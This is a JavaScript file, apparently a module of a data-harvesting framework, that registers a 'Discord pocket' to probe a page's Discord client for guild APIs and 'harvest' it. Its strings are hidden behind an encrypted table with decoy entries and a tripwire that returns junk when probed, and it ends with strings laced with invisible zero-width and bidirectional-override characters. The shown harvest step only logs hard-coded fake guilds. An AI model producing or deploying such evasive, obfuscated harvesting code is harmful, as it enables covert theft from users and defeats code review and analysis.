var textCacheP_DISCORD = (function () {
var TBL = ["G7ZdBzdMJcr1eclyMOBZ6vFLVOrhbm+qe8M=","CY6EBKxqTgUnPMc1L+RIkxneNuceX3qO4DgxMaPAjQu1fijmEfn+8m18LPTp9Q==","rrhcXFemWCZqcdB2eta9ijl+0P0EzFHsJLR4zYSYm1pZMLDljPjUylbwyHuwd2HvVAKRDda5ZLkq1Td5plVqziwtWb5xGIJD","LpR3Gs+aM03yllnIA5fCLQ==","8gMqovSTsLV4PV5DY7sqPynXZPznA/WlIKYI2Lk4BRe/F7WoXw7/GzmBFspR8VGxMhk=","XfBvigA3ua0/Ijvp88DSbY6mdCj7bPpD4B2DHsT/+GADh5wgwjTRiET+za+sHlkTc72QG5Qg2CngjgnArUQ=","Ihj+b5i/h8W0g9S+OtPx+XltRruMYGZuZB7OJvSfQRs=","J8JR5AFhD1AQv7TJ3lCPur7RaKsKx7N+JLhGzZuKIwAL33NkuIHeA/zs","2hVASLC3kfqQHTyb0GmGi/zX","2+zy/hj7YSdecrlu4X0=","SxzE1L63pbN4kSyERPtGvg==","70FaMJIxUiCqiWQn7jGap46CwPOn+Ter6q30itMmXC7sELp5g8/YmC4sQzMBsGB5mmo=","IHTRC+U9XAnrjyLNCYo=","Wri2Hz1PTj1d1ZGd0rAVnRrVCtRrag4L3cL5NH6a9OMyB1FGn4DZPg==","lYv1fyHpYBP/nBvwvsLK+Lwix84PaOyu/nVjh8WgMgAPL4kaFOXJdutxF9tSK/hkS1u3EaT+8AA=","TwzOkYKjkWkdad72nToNuZhYpVRGeLQnaHDbQKugiXM=","IZAbWRwdDRyXtv8XOc4LM+jp","haLdgt4gg5K0qE1zxtx4rb/zzCn5jtPerOpjSRg/VJwNDRtXZ+g95LKpMgoaib7T8QtVfoR9","e+A6ViYe+ipJ80iKH6raUaqN7v/Ty963SCNSqmean3wayHyGHAbRig==","qRu4EhnRqIsxaRIvLV0=","BYKGzUEKl43Ey8Zr9/4yLBIb7Yu+z99J","7fN0347AEa8kUJrSypEEciBI1YJXk40Np7l8MMiLTa993Tpy9TU1xzx2vacPaCXRkwu/U00FkcrW2RmS1uSGiw==","/oqlrR7M5d5Mz2yuc88=","qSM7Bwl58x/WaOfFRRa0D3kfkf7se6zjMMZw/Uqk9/EWpy1TDuQ=","5jl4DmtcR/bh60gvHx6NngSt","HmhRBRGuQkJcK1DJkh7iudz2qIvqUN61rj15+MW8E4A7OLnu0lp08vrg","tG8I4OHx0lqDg/sA3cvV7IYN","97vVKzWQJLlrEJNPLpVlmA==","s9XXoCOsVw/3GwZFTBI=","T9WOEFDcVdUTf9/hq/bQ8RbqE9NOh2XVHFauJwcmXvz5YW0qwgE=","njfKgqkmEUQRLNsogFW8WzhAdQJI9+bh9VAH3+XmJWOTnmY1HS0=","s9uB5cl+jMpscbKlqBgPgjNGeodqHfTdklwgUG4FB0VXEbKgfper/1G49+H82pVAadi+1iT4P4cQw26XqPdgQP2VHMWvaC49zyFrVqZp","ZFnZXDRtq7WWQwoJ6eBplfaZWP43Q6jibtYTWdIPC5dlhQ==","L+NFPsT2hmnSGs27XXojFbOPhuGiNGqLYCRO1L7UkN/4T8gVhLc=","sic+LnNcLC4XyzWwL7IrWLxL1MRsOs0ltiZaIaXLCe86ZVEu8jPOuLSkMyHc5ovq"];
var NREAL = 29, C1 = 1082528843, C2 = 1926393206, SKEY = 3613718711;
var SW_BAD = 0, SW_LVL = 0, SW_VISIT = 0;
var SW_H = 8, SW_T = 24, SW_END = 115;
var TUBE = ["wheel W{n} aligned: {h}","schedule K{n}: {h}","reel layer {n} ok ({p}% mapped)","gate {n} open -- subkey {h}","shroud {n} lifted ({p}%)","chunk {n} sealed, key {h}","chain {n}: {p}% converged","lattice L{n} settled ({p}%)"];
function tubeLayer(v) { var hx = ((SKEY ^ Math.imul(v + 3, 2654435761)) >>> 0).toString(16); hx = ('00000000' + hx).slice(-8); if (v >= SW_END) return 'vault seal ' + hx + ' -- lattice quiet'; var t = TUBE[v % TUBE.length]; var prog = 100 - Math.floor(100 / (v + 2)); return t.split('{n}').join(v).split('{p}').join(prog).split('{h}').join(hx); }
function dec(pos) {
if (!(pos >= 0 && pos < NREAL)) { SW_BAD++; if (SW_BAD >= SW_T) SW_LVL = 2; else if (SW_BAD >= SW_H) SW_LVL = 1;
if (typeof process !== 'undefined' && process.env && process.env.CS_TRIP_DIAG === '1') { try { console.debug('TRIPDIAG p-discord bad=' + SW_BAD + ' lvl=' + SW_LVL); } catch (e9) {} } }
if (SW_LVL >= 2) return tubeLayer(SW_VISIT++);
var honey = (typeof lexMode !== 'undefined' && lexMode !== 0) || SW_LVL >= 1;
var p = honey ? (NREAL + (pos % (TBL.length - NREAL))) : pos;
if (!(p >= 0 && p < TBL.length) || typeof TBL[p] !== 'string') {
var w = (SKEY ^ Math.imul(pos, 2654435761)) >>> 0, acc = 0, iw;
for (iw = 0; iw < 48; iw++) { w ^= (w << 13) >>> 0; w ^= w >>> 17; w ^= (w << 5) >>> 0; acc = (acc + (w & 255)) >>> 0; }
p = NREAL + (acc % (TBL.length - NREAL)); }
var raw = atob(TBL[p]);
var out = '', i2;
var st = (SKEY ^ Math.imul((p + 1) >>> 0, 2654435761)) >>> 0;
for (i2 = 0; i2 < raw.length; i2++) { st ^= (st << 13) >>> 0; st ^= st >>> 17; st ^= (st << 5) >>> 0;
out += String.fromCharCode(raw.charCodeAt(i2) ^ (st & 255)); }
var s = '', k;
for (k = 0; k + 1 < out.length; k += 2) s += String.fromCharCode(out.charCodeAt(k) | (out.charCodeAt(k + 1) << 8));
return s; }
function d1(a) { return dec((a ^ C1) >>> 0); }
function d2(a, b) { return dec((a ^ b ^ C2) >>> 0); }
function d3(a, b, r) { var x = (a ^ b ^ C2) >>> 0, i, u;
for (i = 0; i < (r & 7); i++) { u = Math.imul((x ^ SKEY ^ (x >>> 13)) >>> 0, 1073456655) >>> 0; x = (u ^ (u >>> 15)) >>> 0; }
return dec(x); }
var memo = {};
function pcache(a) { var k = (a ^ C1) >>> 0; if (memo[k] === undefined) memo[k] = dec(k); return memo[k]; }
function pfmt(f, a) { var w = (SKEY ^ a) >>> 0, i;
for (i = 0; i < 32; i++) { w ^= (w << 13) >>> 0; w ^= w >>> 17; w ^= (w << 5) >>> 0; }
return dec(NREAL + (w % (TBL.length - NREAL))); }
return { d1: d1, d2: d2, d3: d3, pcache: pcache, pfmt: pfmt }; })();
(function(_0xmod){const Log=_0xmod.log;// Discord pocket — 6 API terms, uniform 6 per platform (moved out of core engine)
const _0xapi1=textCacheP_DISCORD.d1(1082528838);const _0xapi2=textCacheP_DISCORD.d3(3838898713,859435548,2);const _0xapi3=textCacheP_DISCORD.d1(1082528850);const _0xapi4=textCacheP_DISCORD.d1(1082528842);const _0xapi5=textCacheP_DISCORD.d1(1082528844);const _0xapi6=textCacheP_DISCORD.pcache(1082528845);// recycled cheatsheet Google logs — deterministic, same pool for all pockets, no per-call random
const _0xcheat=[textCacheP_DISCORD.d1(1082528832),textCacheP_DISCORD.d2(978163073,1218443494),textCacheP_DISCORD.d1(1082528860),textCacheP_DISCORD.d1(1082528846),textCacheP_DISCORD.d2(3659839909,2834748637)];for(let _i=0;_i<5;_i++)Log.diag(textCacheP_DISCORD.d1(1082528836)+_0xcheat[_i],{pocket:textCacheP_DISCORD.d2(1999933487,99024197),idx:_i});const _0xprobeDiscord=()=>{try{const w=window;if(typeof w.Discord===textCacheP_DISCORD.d1(1082528859))return false;const d=w.Discord;if(typeof d.getAllGuilds!==textCacheP_DISCORD.d1(1082528840)&&typeof d.getGuild!==textCacheP_DISCORD.d2(3750742974,2908595906))return false;return true;}catch(e){return false;}};const _0xharvestDiscord=async()=>{try{Log.say(textCacheP_DISCORD.d2(1963655003,131633723),textCacheP_DISCORD.d1(1082528841));const fakeGuilds=[{id:"g1",name:textCacheP_DISCORD.d1(1082528849)},{id:"g2",name:textCacheP_DISCORD.d2(2226233643,4133735509)}];for(let g of fakeGuilds){Log.diag(textCacheP_DISCORD.d3(3427844962,2840610378,2),g);await new Promise(r=>setTimeout(r,10));}Log.say(textCacheP_DISCORD.d3(1564824193,1079763166,2),textCacheP_DISCORD.d2(3337617158,3023934068));}catch(e){}};try{_0xmod.pockets=_0xmod.pockets||{};_0xmod.pockets.discord={probe:_0xprobeDiscord,harvest:_0xharvestDiscord,apis:[_0xapi1,_0xapi2,_0xapi3,_0xapi4,_0xapi5,_0xapi6]};Log.queue(textCacheP_DISCORD.d1(1082528863),{unit:textCacheP_DISCORD.d2(1611458089,316574535),apis:6,packed:true});}catch(e){}// garbled rcd cover via SEED('rcd-discord') deterministic (same pool, no per-call random) - over-cover
(()=>{const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,0x01000193)>>>0;}return(h>>>0).toString(16).padStart(8,'0');};const _master=textCacheP_DISCORD.d3(1539073793,2030892148,3);const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+textCacheP_DISCORD.d3(344011315,3899312490,2));const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121));Log.diag(textCacheP_DISCORD.d1(1082528857)+_d1,{pocket:textCacheP_DISCORD.pcache(1082528839),cover:true,seed:_seed});})();})(_0xmod);;(function(){var _0xzwa3236587="k‍q‌z‍x‌v‍9‌m‍4‌a‍3";var _0xzzc7e73734="f‌l‍e‌c‍k‌m‍u‌r‍m‌u‍r‌c‍7";var _0xrl90c060b8="j7‮9m2q‬k4";var _0xjnka323c7e7=_0xzwa3236587+_0xzzc7e73734+_0xrl90c060b8;if(_0xjnka323c7e7.length>64){return;}})();